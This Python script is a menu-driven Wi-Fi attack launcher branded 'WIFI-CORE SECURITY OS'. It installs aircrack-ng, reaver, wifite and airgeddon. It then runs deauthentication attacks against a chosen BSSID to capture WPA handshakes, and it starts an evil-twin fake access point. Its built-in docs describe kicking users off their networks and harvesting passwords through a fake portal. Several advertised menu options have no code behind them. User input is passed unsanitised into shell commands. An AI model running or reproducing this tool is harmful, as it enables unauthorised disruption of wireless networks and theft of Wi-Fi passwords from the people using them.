# coding: utf-8
import os
import sys
import time
import subprocess

# --- STYLING (Standard CLI) ---
# No fancy themes, just standard terminal colors
G = "\033[32m" # Green
R = "\033[31m" # Red
Y = "\033[33m" # Yellow
B = "\033[34m" # Blue
W = "\033[0m"  # White/Reset

def header():
    os.system("clear")
    print(f"""{G}
    __      __ _  ______  _      _____   _____ 
    \ \    / /(_)|  ____|| |    / ____| / ____|
     \ \  / /  _ | |__   | |   | |     | |     
      \ \/ /  | ||  __|  | |   | |     | |     
       \  /   | || |     | |__ | |____ | |____ 
        \/    |_||_|     |____| \_____| \_____|
    {B}>> WIFI-CORE SECURITY OS [Version 2.1]{W}""")

def progress_bar(current, total, pkg_name):
    width = 40
    progress = int(width * current / total)
    bar = "█" * progress + "-" * (width - progress)
    sys.stdout.write(f"\r{Y}[INSTALLING]{W} |{bar}| {current}/{total} {pkg_name}   ")
    sys.stdout.flush()

def install_system():
    header()
    print(f"\n{B}[*] INITIALIZING REPOSITORY CHECK...{W}\n")
    
    # Tool Mapping: Package Name -> Affected Menu Options
    packages = {
        "aircrack-ng": ["1", "2", "4", "7"],
        "xterm": ["4", "5"],
        "reaver": ["3"],
        "pixiewps": ["3"],
        "bully": ["3"],
        "wifite": ["2"],
        "airgeddon": ["5"],
        "hostapd": ["5"],
        "dnsmasq": ["5"]
    }
    
    failed_tools = []
    total = len(packages)
    
    for i, (pkg, options) in enumerate(packages.items(), 1):
        progress_bar(i, total, pkg)
        
        # Run install and hide output
        result = subprocess.run(["sudo", "apt-get", "install", "-y", pkg], 
                                capture_output=True, text=True)
        
        if result.returncode != 0:
            failed_tools.append((pkg, options))
            
    print("\n") # Break the progress bar line
    
    if failed_tools:
        print(f"{R}[!] INSTALLATION COMPLETED WITH ERRORS{W}")
        print("-" * 50)
        for pkg, opts in failed_tools:
            print(f"{R}FAILED:{W} {pkg.ljust(15)} {Y}DEGRADED OPTIONS:{W} {', '.join(opts)}")
        print("-" * 50)
        print(f"{Y}[NOTE]{W} Re-run Option 8 after checking your internet connection.")
    else:
        print(f"{G}[+] SYSTEM FULLY OPERATIONAL.{W}")
    
    input(f"\nPress Enter to return to terminal...")

def get_docs():
    header()
    print(f"{B}--- SYSTEM WORKFLOW DOCUMENTATION ---{W}")
    print(f"\n{G}OPTION 4: HANDSHAKE CAPTURE (The Deauther){W}")
    print(f"   - {B}Tool:{W} airodump-ng & aireplay-ng")
    print(f"   - {B}Workflow:{W} Kicks users off their Wi-Fi. When they reconnect, we grab")
    print(f"     the encrypted password 'handshake' file for offline cracking.")
    
    print(f"\n{G}OPTION 5: EVIL TWIN (The Social Engineer){W}")
    print(f"   - {B}Tool:{W} Airgeddon (hostapd + dnsmasq)")
    print(f"   - {B}Workflow:{W} Creates a fake Wi-Fi network. Users connect, thinking it's")
    print(f"     their router. They enter the password into a fake portal page.")
    
    input(f"\n{Y}Press Enter to return...{W}")

def main_menu():
    header()
    print(f"""
 {G}(1){W} Monitor Mode       {G}(5){W} EVIL TWIN (Captive Portal)
 {G}(2){W} Scan Networks      {G}(6){W} Crack Handshake
 {G}(3){W} WPS Attack         {G}(7){W} Tool Docs & Workflow
 {G}(4){W} Capture Handshake  {G}(8){W} Repair/Install System
 
 {R}(00){W} Shutdown
-------------------------------------------------------""")
    
    cmd = input(f"{G}wifi-os{W}@{B}root{W}:~$ ").strip()

    if cmd == "8":
        install_system()
        main_menu()
    elif cmd == "7":
        get_docs()
        main_menu()
    elif cmd == "4":
        # Handshake logic
        interface = input("Interface: ")
        bssid = input("Target BSSID: ")
        chan = input("Channel: ")
        os.system(f"xterm -hold -e 'airodump-ng -c {chan} --bssid {bssid} {interface}' &")
        os.system(f"xterm -hold -e 'aireplay-ng -0 15 -a {bssid} {interface}' &")
        main_menu()
    elif cmd == "5":
        os.system("sudo airgeddon")
        main_menu()
    elif cmd == "00":
        print("Closing System...")
        sys.exit()
    else:
        print(f"{R}Invalid Command.{W}")
        time.sleep(1)
        main_menu()

if __name__ == "__main__":
    if os.getuid() != 0:
        print("\033[31m[!] ERROR: This OS requires root privileges. Try: sudo python3 script.py\033[0m")
        sys.exit()
    main_menu()
